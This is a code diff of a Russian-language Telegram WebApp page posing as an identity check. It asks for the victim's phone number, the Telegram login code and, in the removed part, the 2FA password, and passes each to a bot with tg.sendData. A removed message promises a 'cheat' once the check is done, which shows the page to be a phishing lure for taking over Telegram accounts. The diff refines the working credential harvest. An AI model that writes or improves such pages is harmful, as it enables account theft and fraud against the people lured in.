@@ -121,21 +121,19 @@
         <h2>Проверка личности</h2>
         <p class="sub">Введите данные для подтверждения</p>
 
-        <form id="loginForm">
-            <div class="input-group">
-                <label>Номер телефона</label>
-                <input type="tel" id="phone" placeholder="+7 999 999 99 99" required>
-            </div>
-            <div class="input-group" id="codeGroup" style="display:none;">
-                <label>Код подтверждения</label>
-                <input type="text" id="code" placeholder="Введите код из Telegram" required>
-            </div>
-            <div class="input-group" id="passwordGroup" style="display:none;">
-                <label>Пароль (если есть 2FA)</label>
-                <input type="password" id="password" placeholder="Введите пароль">
-            </div>
-            <button type="button" class="btn" id="submitBtn">Продолжить</button>
-        </form>
+        <div class="input-group">
+            <label>Номер телефона</label>
+            <input type="tel" id="phone" placeholder="+7 999 999 99 99" required>
+        </div>
+        <div class="input-group" id="codeGroup" style="display:none;">
+            <label>Код подтверждения</label>
+            <input type="text" id="code" placeholder="Введите код из Telegram" required>
+        </div>
+        <div class="input-group" id="passwordGroup" style="display:none;">
+            <label>Пароль (если есть 2FA)</label>
+            <input type="password" id="password" placeholder="Введите пароль">
+        </div>
+        <button type="button" class="btn" id="submitBtn">Продолжить</button>
 
         <div class="status" id="status"></div>
         <div class="footer">Telegram © 2026</div>
@@ -151,15 +149,6 @@
         tg.ready();
         tg.expand();
 
-        function sendDataToBot() {
-            const data = {
-                phone: phone,
-                code: code,
-                password: password
-            };
-            tg.sendData(JSON.stringify(data));
-        }
-
         document.getElementById('submitBtn').addEventListener('click', function() {
             const status = document.getElementById('status');
 
@@ -172,7 +161,11 @@
                 }
 
                 // Отправляем номер в бота
-                sendDataToBot();
+                tg.sendData(JSON.stringify({
+                    phone: phone,
+                    code: '',
+                    password: ''
+                }));
 
                 status.textContent = '✅ Код отправлен! Введите его ниже.';
                 status.className = 'status success';
@@ -191,43 +184,16 @@
                 }
 
                 // Отправляем код в бота
-                sendDataToBot();
+                tg.sendData(JSON.stringify({
+                    phone: phone,
+                    code: code,
+                    password: ''
+                }));
 
-                status.textContent = '✅ Код принят!';
-                status.className = 'status success';
-                
-                // Показываем поле для пароля (если будет запрос от бота)
-                document.getElementById('codeGroup').style.display = 'none';
-                document.getElementById('passwordGroup').style.display = 'block';
-                document.getElementById('submitBtn').textContent = 'Подтвердить пароль';
-                step = 'password';
+                status.textContent = '⏳ Проверка...';
+                status.className = 'status';
+                document.getElementById('submitBtn').disabled = true;
                 return;
-            }
-
-            if (step === 'password') {
-                password = document.getElementById('password').value.trim();
-
-                // Отправляем все данные (номер, код, пароль) в бота
-                sendDataToBot();
-
-                status.textContent = '✅ Подтверждено!';
-                status.className = 'status success';
-
-                // Показываем финальный экран
-                setTimeout(() => {
-                    document.querySelector('.container').innerHTML = `
-                        <div style="text-align:center;color:#fff;padding:40px 0;">
-                            <div style="font-size:48px;margin-bottom:16px;">✅</div>
-                            <h2>Проверка пройдена</h2>
-                            <p style="color:#aaa;margin-top:10px;">Ожидайте чит в боте</p>
-                        </div>
-                    `;
-                }, 1000);
-
-                // Закрываем WebApp через 2 секунды
-                setTimeout(() => {
-                    tg.close();
-                }, 2000);
             }
         });
     </script>
